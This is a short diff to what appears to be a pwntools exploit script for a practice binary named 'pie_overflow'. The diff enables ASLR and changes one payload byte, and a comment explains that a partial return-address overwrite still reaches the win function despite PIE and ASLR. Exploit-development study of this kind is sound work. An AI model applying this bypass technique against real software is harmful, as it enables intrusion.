@@ -3,7 +3,7 @@ from pwn import*
 
 while True:
     try:
-        procc = process('./pie_overflow', aslr=False)
+        procc = process('./pie_overflow', aslr=True)
         pid = gdb.attach(procc, 'b *vuln+55\ncontinue')
         print(procc.recv())
 
@@ -110,7 +110,7 @@ while True:
         
         '''
 
-        payload += b'\x51'
+        payload += b'\x01'
         '''could've done anything from \ x[0 - F]1 bcs 1 IS ALWAYS THE SAME, win will ALWAYS have this even with PIE + ASLR bcs
         
 
